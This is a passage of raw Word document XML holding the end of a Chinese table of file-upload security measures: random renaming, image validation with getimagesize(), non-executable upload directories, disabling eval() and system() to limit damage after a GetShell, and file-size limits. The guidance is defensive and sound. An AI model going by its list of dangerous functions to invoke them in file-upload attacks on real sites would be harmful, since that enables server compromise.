          <w:p w14:paraId="4A35C5B4" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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同时检查三种类型，提高绕过难度</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="0157761A" w14:textId="77777777" w:rsidTr="00BF0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7F8901" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>文件重命名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="01B7C043" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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上传后使用随机字符串重命名，去掉用户可控的后缀</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="662EF29A" w14:textId="77777777" w:rsidTr="00BF0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5A79EC" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>文件内容深度检测</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="11041F3C" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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使用专门库（如</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> getimagesize()</w:t>
            </w:r>
            <w:r>
              <w:t>）验证图片真实性</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="383F706D" w14:textId="77777777" w:rsidTr="00BF0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1DFDFB" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>上传目录权限控制</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="43A551C9" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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禁止执行权限，或将上传目录置于</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> Web </w:t>
            </w:r>
            <w:r>
              <w:t>根目录之外</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="0C5A45A4" w14:textId="77777777" w:rsidTr="00BF02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C8C85B" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>禁用危险函数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="55BB4531" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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如</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> eval()</w:t>
            </w:r>
            <w:r>
              <w:t>、</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">system() </w:t>
            </w:r>
            <w:r>
              <w:t>等，降低被</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> GetShell </w:t>
            </w:r>
            <w:r>
              <w:t>后的危害</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="391930FD" w14:textId="77777777" w:rsidTr="00BF0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2E5A13" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>限制文件大小</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="53427F44" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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防止通过大文件进行拒绝服务攻击（</w:t>
            </w:r>
            <w:r>
              <w:t>DoS</w:t>
            </w:r>
            <w:r>
              <w:t>）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1EC9B1B4" w14:textId="77777777" w:rsidR="005649BE" w:rsidRDefault="005649BE"/>
    <w:sectPr w:rsidR="005649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9BE"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00BF0279"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00E443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83D307"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{5A305663-771A-43D7-8ADE-38BBE19BC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1203</Words>
  <Characters>1973</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>116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梁 张</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-08T08:40:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>